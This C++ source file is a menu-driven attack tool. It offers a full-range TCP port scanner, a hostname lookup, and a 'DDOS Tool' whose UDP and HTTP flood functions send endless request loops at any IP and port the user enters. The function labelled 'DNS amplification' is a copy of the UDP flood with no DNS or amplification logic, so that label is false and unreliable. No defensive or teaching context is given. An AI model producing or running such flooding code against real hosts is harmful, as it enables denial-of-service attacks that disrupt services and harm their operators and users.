#include <iostream>
#include <string>
#include <curl/curl.h>
#include <chrono>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

// Function to send an HTTP request
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// Function to perform a UDP flood
void udpFlood(const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cout << "\033[1;31mFailed to create socket\033[0m" << std::endl;
        return;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    char buffer[1024];
    for (int i = 0; i < 1024; i++) {
        buffer[i] = 'A';
    }

    while (true) {
        sendto(sock, buffer, 1024, 0, (struct sockaddr*)&server, sizeof(server));
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(sock);
}

// Function to perform an HTTP flood
void httpFlood(const std::string &ip, int port) {
    CURL *curl;
    CURLcode res;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        std::string url = "http://" + ip + ":" + std::to_string(port);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        while (true) {
            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                std::cout << "\033[1;31mFailed to send request: " << curl_easy_strerror(res) << "\033[0m" << std::endl;
            } else {
                std::cout << "\033[1;32mRequest sent successfully\033[0m" << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// Function to perform a DNS amplification attack
void dnsAmplification(const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cout << "\033[1;31mFailed to create socket\033[0m" << std::endl;
        return;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    char buffer[1024];
    for (int i = 0; i < 1024; i++) {
        buffer[i] = 'A';
    }

    while (true) {
        sendto(sock, buffer, 1024, 0, (struct sockaddr*)&server, sizeof(server));
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(sock);
}

// Function to perform a port scan
void portScan(const std::string &ip) {
    for (int port = 1; port <= 65535; port++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cout << "\033[1;31mFailed to create socket\033[0m" << std::endl;
            return;
        }

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            std::cout << "\033[1;32mPort " << port << " is open\033[0m" << std::endl;
        } else {
            std::cout << "\033[1;31mPort " << port << " is closed\033[0m" << std::endl;
        }

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// Function to perform an IP lookup
void ipLookup(const std::string &ip) {
    struct hostent *he;
    he = gethostbyname(ip.c_str());
    if (he == NULL) {
        std::cout << "\033[1;31mFailed to perform IP lookup\033[0m" << std::endl;
        return;
    }

    std::cout << "\033[1;32mIP Address: " << ip << "\033[0m" << std::endl;
    std::cout << "\033[1;32mHostname: " << he->h_name << "\033[0m" << std::endl;
}

int main() {
    while (true) {
        std::cout << "\033[1;34mMain Menu\033[0m" << std::endl;
        std::cout << "1. Port Scanner" << std::endl;
        std::cout << "2. IP Lookup" << std::endl;
        std::cout << "3. DDOS Tool" << std::endl;
        std::cout << "4. Exit" << std::endl;

        int choice;
        std::cin >> choice;

        switch (choice) {
            case 1: {
                std::string ip;
                std::cout << "\033[1;34mEnter the IP address: \033[0m";
                std::cin >> ip;
                portScan(ip);
                break;
            }
            case 2: {
                std::string ip;
                std::cout << "\033[1;34mEnter the IP address: \033[0m";
                std::cin >> ip;
                ipLookup(ip);
                break;
            }
            case 3: {
                std::string ip;
                int port;
                std::cout << "\033[1;34mEnter the IP address: \033[0m";
                std::cin >> ip;
                std::cout << "\033[1;34mEnter the port: \033[0m";
                std::cin >> port;

                std::cout << "\033[1;34mChoose a method: \033[0m" << std::endl;
                std::cout << "1. UDP Flood" << std::endl;
                std::cout << "2. HTTP Flood" << std::endl;
                std::cout << "3. DNS Amplification" << std::endl;

                int method;
                std::cin >> method;

                switch (method) {
                    case 1:
                        udpFlood(ip, port);
                        break;
                    case 2:
                        httpFlood(ip, port);
                        break;
                    case 3:
                        dnsAmplification(ip, port);
                        break;
                    default:
                        std::cout << "\033[1;31mInvalid method\033[0m" << std::endl;
                }
                break;
            }
            case 4:
                return 0;
            default:
                std::cout << "\033[1;31mInvalid choice\033[0m" << std::endl;
        }
    }

    return 0;
}
